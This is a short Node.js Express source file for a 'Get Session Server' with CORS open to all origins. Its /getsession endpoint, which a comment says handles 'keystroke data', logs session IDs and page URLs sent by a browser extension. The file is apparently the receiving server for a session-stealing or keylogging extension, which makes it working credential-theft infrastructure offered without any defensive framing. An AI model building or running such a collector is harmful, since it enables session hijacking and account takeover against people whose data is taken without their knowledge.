const express = require('express');
const cors = require('cors');
const app = express();
const port = 3000;

// Middleware to parse JSON request bodies
app.use(cors()); // Allow all origins
app.use(express.json());

// Define a GET route for the root URL
app.get('/', (req, res) => {
  res.send('Welcome to the Get Session Server!');
});

// Endpoint to handle keystroke data
app.post('/getsession', (req, res) => {
  //const sessionData = req.body;
  const { sessionData, url } = req.body;
  console.log(`URL: ${url}\nSession IDs:`, JSON.stringify(sessionData, null, 2));
  res.sendStatus(200); // Respond to the extension with a success status
});

// Start the server
app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
});
